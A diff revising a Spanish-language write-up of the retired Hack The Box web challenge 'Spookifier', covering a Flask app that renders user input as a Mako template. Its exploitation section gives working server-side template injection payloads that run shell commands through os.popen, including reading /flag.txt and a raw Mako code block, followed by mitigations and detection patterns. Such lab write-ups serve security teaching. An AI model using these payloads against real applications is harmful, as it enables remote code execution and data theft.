@@ -1,7 +1,7 @@
 ---
 challenge: Spookifier
 type: Web
-difficulty: Easy
+difficulty: Very Easy
 platform: Hack The Box
 state: Retired
 tags: [web, flask, mako, ssti, rce]
@@ -15,7 +15,7 @@ tags: [web, flask, mako, ssti, rce]
 
 ## TL;DR
 
-Convertidor de texto con «estilos» que renderiza la entrada con **Mako**, el motor de plantillas de Python basado en `${}`. No hace falta cadena de globals: `self` está expuesto y desde ahí se llega a `os` en una línea.
+Convertidor de texto con «estilos» que renderiza la entrada con **Mako**, el motor de plantillas de Python basado en `${}`. No hace falta cadena de globals: `self` está expuesto y desde ahí se llega a `os` en una línea. El reto **entrega el código** (`spookifier.zip`: `main.py`, `routes.py`, `util.py`), así que el vector se lee, no se adivina.
 
 ## Enunciado y superficie
 
@@ -23,11 +23,21 @@ Un campo de texto y varios botones de estilo. Al enviar, el texto aparece «deco
 
 ## Reconocimiento
 
-- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».
+El paquete incluye el código de la aplicación y un `flag.txt` **de prueba**: el flag válido se lee del servidor, no del ZIP. `Dockerfile` expone el servicio en **1337** y el parámetro de entrada se llama `text` (`/?text=...`).
 
 ## Análisis del código
 
-- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».
+En `util.py`, `spookify()` pasa el texto por cuatro «fuentes» y `generate_render()` mete el resultado en un `Template(...)` de **Mako**. La cuarta fuente conserva los caracteres ASCII —incluidos `<`, `%` y `>`—, así que el payload entra por esa columna.
+
+```python
+from mako.template import Template
+
+def generate_render(converted_fonts):
+    result = "<tr>" + "".join(converted_fonts) + "</tr>"   # font4 = ASCII
+    return Template(result).render()
+```
+
+`render()` sin contexto evalúa `${...}` como **expresión Python**.
 
 ## Explicación del fallo
 
@@ -49,26 +59,28 @@ ${7*'7'}    -> 7777777
 
 ## Reproducción local
 
-- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.
+Se puede levantar el propio `spookifier.zip` en Docker y atacar `127.0.0.1:1337`; el `flag.txt` incluido es un señuelo, así que la prueba válida es la ejecución de un comando (`id`), no leer ese fichero.
 
 ## Explotación
 
-En Mako, `self` es el objeto `Template` y expone módulos internos:
+Confirmar el motor y ejecutar:
 
 ```text
-${self.module.cache.util.os.popen('cat /flag*').read()}
+/?text=${7*7}                                    -> 49
+/?text=${"z".join("ab")}                         -> azb
+/?text=${self.module.cache.util.os.popen('id').read()}
 ```
 
-Otras rutas equivalentes:
+`os.system()` devuelve sólo el código de salida (`0`), así que no sirve para leer: hay que usar `popen(...).read()`. Para el flag:
 
 ```text
-${self.module.cache.util.os.system('id')}
-${self.template.module._os.popen('cat /flag*').read()}
-${''.__class__.__mro__[1].__subclasses__()}
+/?text=${self.module.cache.util.os.popen('cat /flag.txt').read()}
 ```
 
+Alternativa con bloque de código Mako, sin `self`:
+
 ```text
-HTB{<flag>}
+/?text=<% import os; context.write(os.popen('cat /flag.txt').read()) %>
 ```
 
 ## Evidencia
@@ -88,7 +100,10 @@ HTB{<flag>}
 
 ## Mitigaciones y detección
 
-- No construir plantillas con entrada del usuario; usar sandbox y contexto restringido.
+- No construir plantillas con entrada del usuario: `Template(...)` sobre datos externos es ejecución de código por diseño.
+- Si hay que renderizar texto, pasarlo como **variable** (`render(text=text)`), nunca concatenarlo en la plantilla.
+- Escapar la salida y validar el texto contra un allowlist de caracteres esperados.
+- Detección: peticiones con `${`, `<%` o `%>` en parámetros, y procesos web que abren shells o leen `/flag.txt`.
 
 ## Referencias
 
